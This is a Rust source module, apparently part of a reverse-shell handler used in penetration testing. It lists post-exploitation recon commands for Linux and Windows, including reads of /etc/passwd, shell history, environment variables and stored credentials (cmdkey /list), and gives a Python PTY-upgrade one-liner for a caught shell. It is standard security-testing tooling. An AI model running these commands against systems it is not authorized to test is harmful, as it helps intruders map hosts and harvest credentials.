//! Post-exploitation recipes run through a caught raw shell: OS-appropriate
//! situational-awareness recon, and the PTY-upgrade one-liner. Standard,
//! tool-free techniques for authorized engagements.

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Os {
    Linux,
    Windows,
}

impl Os {
    pub fn parse(s: &str) -> Os {
        match s.trim().to_ascii_lowercase().as_str() {
            "win" | "windows" | "w" => Os::Windows,
            _ => Os::Linux,
        }
    }
}

/// Ordered recon commands. `full=false` returns the quick set.
pub fn recon(os: Os, full: bool) -> Vec<&'static str> {
    match os {
        Os::Linux => {
            let mut v = vec![
                "id",
                "hostname",
                "uname -a",
                "sudo -n -l 2>/dev/null",
                "ip -o addr 2>/dev/null || ifconfig -a 2>/dev/null",
            ];
            if full {
                v.extend([
                    "cat /etc/os-release 2>/dev/null",
                    "cat /etc/passwd 2>/dev/null",
                    "ls -la /home 2>/dev/null",
                    "find / -perm -4000 -type f 2>/dev/null",
                    "getcap -r / 2>/dev/null",
                    "ss -tunlp 2>/dev/null || netstat -tunlp 2>/dev/null",
                    "crontab -l 2>/dev/null; ls -la /etc/cron* 2>/dev/null",
                    "env",
                    "cat ~/.bash_history 2>/dev/null | tail -40",
                ]);
            }
            v
        }
        Os::Windows => {
            let mut v = vec![
                "whoami",
                "whoami /priv",
                "hostname",
                "ipconfig /all",
                "net user",
            ];
            if full {
                v.extend([
                    "whoami /all",
                    "systeminfo",
                    "net localgroup administrators",
                    "netstat -ano",
                    "wmic qfe get HotFixID,InstalledOn 2>nul",
                    "cmdkey /list",
                    "schtasks /query /fo LIST 2>nul | findstr /i taskname",
                    "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services 2>nul",
                ]);
            }
            v
        }
    }
}

/// The interactive-PTY upgrade command to send into a Linux shell, plus the
/// operator-side follow-up (done after /interact).
pub fn pty_upgrade(os: Os) -> (&'static str, &'static str) {
    match os {
        Os::Linux => (
            "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' || python -c 'import pty;pty.spawn(\"/bin/bash\")' || script -qc /bin/bash /dev/null",
            "then: /interact, press Ctrl-Z, run `stty raw -echo; fg`, then `export TERM=xterm; stty rows 50 cols 200`",
        ),
        Os::Windows => (
            "powershell -nop -c \"$host.UI.RawUI\"",
            "Windows raw shells have no true PTY without ConPtyShell; just /interact and work in the raw shell",
        ),
    }
}
